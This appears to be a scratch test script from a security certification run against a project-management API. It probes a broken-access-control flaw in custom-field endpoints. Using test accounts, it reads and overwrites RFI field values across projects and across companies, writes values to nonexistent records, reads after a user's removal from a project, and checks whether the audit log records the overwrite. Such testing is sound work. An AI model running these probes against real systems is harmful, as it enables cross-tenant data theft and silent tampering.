'use strict';
/**
 * L45 independent check (scratch). Reuses project Q / RFI R left by a run of
 * l45-custom-field-values-no-record-check.js (pass them as argv[2], argv[3]).
 *
 *  A. a value the PM stored on R (through Q) BEFORE the attack is read by the planner through P
 *     (single GET and the bulk GET) -> a real read of data the attacker did not send in;
 *  B. a Q-only (project-scoped) field's value is returned by the bulk GET through P;
 *  C. a record id that does not exist at all is accepted (orphan values);
 *  D. cross-company: a company-042 RFI id addressed by the 028 planner -> what 042 sees afterwards;
 *  E. removed-member path: how an excluded user comes to know a record id;
 *  F. where the audit event of the cross-project write lands.
 */
const crypto = require('crypto');
const { as } = require('../../lib/api');
const { ATTACKER, VICTIM } = require('../_fib-constants');

const Q = process.argv[2];
const R = process.argv[3];
const line = (s) => console.log(s);
const brief = (res) => `${res.status} ${JSON.stringify(res.body?.error?.code || res.body?.data || '').slice(0, 420)}`;

(async () => {
  if (!Q || !R) throw new Error('usage: l45-check.js <projectQ> <rfiR>');
  const P = ATTACKER.project;
  const pm = as(ATTACKER.pm, ATTACKER.orgId);
  const planner = as('planner@c028.octapm-cert.test', ATTACKER.orgId);
  const victimPm = as(VICTIM.pm, VICTIM.orgId);

  line(`P=${P} Q=${Q} R=${R}`);
  line(`planner GET /projects/Q -> ${(await planner.send('GET', `/projects/${Q}`)).status}`);
  line(`planner GET /projects/Q/rfi/R -> ${brief(await planner.send('GET', `/projects/${Q}/rfi/${R}`))}`);
  line(`planner GET /projects/P/rfi/R -> ${brief(await planner.send('GET', `/projects/${P}/rfi/${R}`))}`);

  // ── A. PM stores a secret through Q first ──
  const secretA = `pm-secret-${Date.now()}`;
  const pmWrite = await pm.send('PUT', `/projects/${Q}/custom-fields/values/rfi/${R}`, { values: { cert_l45_probe: secretA }, partial: true });
  line(`A. PM PUT values via Q {cert_l45_probe:${secretA}} -> ${pmWrite.status}`);
  const readSingle = await planner.send('GET', `/projects/${P}/custom-fields/values/rfi/${R}`);
  line(`A. planner GET single via P -> ${readSingle.status} values=${JSON.stringify(readSingle.body?.data?.values)}`);
  const readBulk = await planner.send('GET', `/projects/${P}/custom-fields/values?recordType=rfi&recordIds=${R}`);
  line(`A. planner GET bulk via P -> ${readBulk.status} items=${JSON.stringify(readBulk.body?.data?.items)}`);
  const leakA = readSingle.body?.data?.values?.cert_l45_probe === secretA;
  const leakBulk = readBulk.body?.data?.items?.[R]?.cert_l45_probe === secretA;

  // ── B. Q-only project field ──
  const defs = await pm.send('GET', `/projects/${Q}/custom-fields/definitions?recordType=rfi`);
  let qField = defs.body?.data?.items?.find((f) => f.key === 'cert_l45_q_only');
  if (!qField) {
    const made = await pm.send('POST', `/projects/${Q}/custom-fields/definitions`, { recordType: 'rfi', type: 'text', label: 'Cert L45 Q only', key: 'cert_l45_q_only' });
    line(`B. PM POST Q-only definition -> ${brief(made)}`);
    qField = made.body?.data;
  }
  const secretB = `q-only-secret-${Date.now()}`;
  const pmWriteB = await pm.send('PUT', `/projects/${Q}/custom-fields/values/rfi/${R}`, { values: { cert_l45_q_only: secretB }, partial: true });
  line(`B. PM PUT Q-only value via Q -> ${pmWriteB.status}`);
  const readSingleB = await planner.send('GET', `/projects/${P}/custom-fields/values/rfi/${R}`);
  line(`B. planner GET single via P -> ${readSingleB.status} values=${JSON.stringify(readSingleB.body?.data?.values)}`);
  const readBulkB = await planner.send('GET', `/projects/${P}/custom-fields/values?recordType=rfi&recordIds=${R}`);
  line(`B. planner GET bulk via P -> ${readBulkB.status} items=${JSON.stringify(readBulkB.body?.data?.items)}`);
  const leakB = readBulkB.body?.data?.items?.[R]?.cert_l45_q_only === secretB;

  // ── C. non-existent record id ──
  const ghost = crypto.randomUUID();
  const ghostPut = await planner.send('PUT', `/projects/${P}/custom-fields/values/rfi/${ghost}`, { values: { cert_l45_probe: 'ghost' }, partial: true });
  const ghostGet = await planner.send('GET', `/projects/${P}/custom-fields/values/rfi/${ghost}`);
  line(`C. planner PUT values on non-existent rfi ${ghost} -> ${ghostPut.status}; GET -> ${ghostGet.status} values=${JSON.stringify(ghostGet.body?.data?.values)}`);
  // tidy: null removes the orphan value
  await planner.send('PUT', `/projects/${P}/custom-fields/values/rfi/${ghost}`, { values: { cert_l45_probe: null }, partial: true });

  // ── D. cross-company ──
  const vList = await victimPm.send('GET', `/projects/${VICTIM.project}/rfi`);
  const vItems = vList.body?.data?.items || vList.body?.data || [];
  const vRfi = Array.isArray(vItems) ? vItems[0] : null;
  line(`D. 042 PM lists RFIs in ${VICTIM.project} -> ${vList.status}, first id=${vRfi?.id}`);
  if (vRfi?.id) {
    const before = await victimPm.send('GET', `/projects/${VICTIM.project}/custom-fields/values/rfi/${vRfi.id}`);
    line(`D. 042 PM GET own values before -> ${before.status} values=${JSON.stringify(before.body?.data?.values)} fields=${JSON.stringify((before.body?.data?.fields || []).map((f) => f.key))}`);
    const xRead = await planner.send('GET', `/projects/${P}/custom-fields/values/rfi/${vRfi.id}`);
    line(`D. 028 planner GET values of the 042 RFI via P -> ${xRead.status} values=${JSON.stringify(xRead.body?.data?.values)}`);
    const xBulk = await planner.send('GET', `/projects/${P}/custom-fields/values?recordType=rfi&recordIds=${vRfi.id}`);
    line(`D. 028 planner GET bulk of the 042 RFI via P -> ${xBulk.status} items=${JSON.stringify(xBulk.body?.data?.items)}`);
    const xWrite = await planner.send('PUT', `/projects/${P}/custom-fields/values/rfi/${vRfi.id}`, { values: { cert_l45_probe: 'from-028' }, partial: true });
    line(`D. 028 planner PUT values on the 042 RFI via P -> ${xWrite.status}`);
    const after = await victimPm.send('GET', `/projects/${VICTIM.project}/custom-fields/values/rfi/${vRfi.id}`);
    const afterBulk = await victimPm.send('GET', `/projects/${VICTIM.project}/custom-fields/values?recordType=rfi&recordIds=${vRfi.id}`);
    line(`D. 042 PM GET own values after -> ${after.status} values=${JSON.stringify(after.body?.data?.values)}; bulk items=${JSON.stringify(afterBulk.body?.data?.items)}`);
    const vAudit = await victimPm.send('GET', `/projects/${VICTIM.project}/audit?entityType=rfi&entityId=${vRfi.id}`);
    const vEvents = vAudit.body?.data?.items || vAudit.body?.data?.events || vAudit.body?.data || [];
    line(`D. 042 PM audit for that RFI -> ${vAudit.status}, events mentioning cert_l45: ${Array.isArray(vEvents) ? vEvents.filter((e) => JSON.stringify(e).includes('cert_l45')).length : 'n/a'}`);
    // tidy the 028-side junk row
    await planner.send('PUT', `/projects/${P}/custom-fields/values/rfi/${vRfi.id}`, { values: { cert_l45_probe: null }, partial: true });
  }

  // ── E. removed-member path ──
  const team = await pm.send('GET', `/projects/${P}/team`);
  const data = team.body?.data;
  const members = (Array.isArray(data) ? data : data?.members || data?.items || data?.users || data?.team) || [];
  const plannerRow = Array.isArray(members) ? members.find((m) => (m.email || m.user?.email) === 'planner@c028.octapm-cert.test') : null;
  const plannerId = plannerRow?.userId || plannerRow?.user?.id || plannerRow?.id;
  line(`E. planner user id (from P team) = ${plannerId} ${plannerId ? '' : JSON.stringify(data).slice(0, 400)}`);
  if (plannerId) {
    const add = await pm.send('POST', `/projects/${Q}/team`, { userId: plannerId });
    line(`E. PM adds planner to Q -> ${add.status}`);
    const list = await planner.send('GET', `/projects/${Q}/rfi`);
    const items = list.body?.data?.items || list.body?.data || [];
    line(`E. planner lists Q RFIs while a member -> ${list.status}, sees R: ${Array.isArray(items) && items.some((i) => i.id === R)}`);
    const rem = await pm.send('DELETE', `/projects/${Q}/team/${plannerId}`);
    line(`E. PM removes planner from Q -> ${rem.status}`);
    line(`E. planner GET /projects/Q/rfi/R after removal -> ${brief(await planner.send('GET', `/projects/${Q}/rfi/${R}`))}`);
    const afterRem = await planner.send('GET', `/projects/${P}/custom-fields/values?recordType=rfi&recordIds=${R}`);
    line(`E. planner bulk GET values of R via P after removal -> ${afterRem.status} items=${JSON.stringify(afterRem.body?.data?.items)}`);
  }

  // ── F. audit of the cross-project write ──
  const secretF = `planner-overwrote-${Date.now()}`;
  const over = await planner.send('PUT', `/projects/${P}/custom-fields/values/rfi/${R}`, { values: { cert_l45_probe: secretF }, partial: true });
  line(`F. planner overwrites the PM's value via P -> ${over.status}`);
  const pmSees = await pm.send('GET', `/projects/${Q}/custom-fields/values/rfi/${R}`);
  line(`F. PM GET via Q -> cert_l45_probe=${JSON.stringify(pmSees.body?.data?.values?.cert_l45_probe)} (was ${secretA})`);
  for (const [name, proj] of [['P', P], ['Q', Q]]) {
    const audit = await pm.send('GET', `/projects/${proj}/audit?entityType=rfi&entityId=${R}`);
    const d = audit.body?.data;
    const events = (Array.isArray(d) ? d : d?.items || d?.events) || [];
    const hits = Array.isArray(events) ? events.filter((e) => JSON.stringify(e).includes(secretF)) : [];
    line(`F. audit of project ${name} for rfi R -> ${audit.status}, events=${Array.isArray(events) ? events.length : 'n/a'}, carrying the planner's overwrite: ${hits.length}`);
  }

  line('');
  line(`pre-existing value read through P (single): ${leakA}; (bulk): ${leakBulk}; Q-only field through bulk: ${leakB}`);
})().catch((e) => {
  console.error('ERROR', e.message);
  process.exitCode = 1;
});
